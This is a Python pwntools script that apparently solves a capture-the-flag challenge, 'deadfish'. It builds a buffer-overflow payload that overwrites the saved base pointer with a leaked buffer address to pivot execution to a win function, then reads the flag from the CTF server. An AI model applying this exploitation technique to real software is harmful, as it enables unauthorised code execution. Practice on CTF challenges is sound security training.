from pwn import *

if __name__ == "__main__":
    context.log_level = "error"
    # io = process("./deadfish")
    io = remote("chall.ctf-league.osusec.org", 1385)

    # get win function address
    binary = ELF("deadfish")
    win_addr = binary.symbols["win"]

    # parse buffer address from provided prompt
    addr_line = io.readlineS(False)
    buffer_addr = int(addr_line.split()[-1][:-1], 16)

    payload = b"i" * 7 + b"\0"  # valid deadfish code terminated with null byte
    payload += p64(win_addr)  # win function address
    payload += b"i" * 240  # garbage to fill the buffer
    payload += p64(buffer_addr)  # overwrite base pointer with buffer address

    print(f"Payload: {payload}")

    io.sendline(payload)
    print(io.recvuntil(b"}").decode())
